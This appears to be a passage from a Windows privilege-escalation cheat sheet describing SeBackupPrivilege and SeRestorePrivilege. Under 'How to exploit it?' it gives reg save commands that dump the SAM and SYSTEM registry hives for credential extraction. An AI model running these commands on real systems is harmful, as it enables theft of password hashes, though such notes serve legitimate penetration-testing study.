### SeBackupPrivilege
This particular privilege enables an user file content retrieval, even if the security descriptor on the file might not grant such access. A caller with SeBackupPrivilege enabled obviates the need for any ACL-based security check.

#### How to exploit it?
You can dump the SAM running the command:
```
reg save hklm\sam C:\temp\sam.hive
```
and
```
reg save hklm\system C:\temp\system.hive
```

### SeRestorePrivilege
It allows file content modification, even if the security descriptor on the file might not grant such access. This function can also be used to change the owner and protection.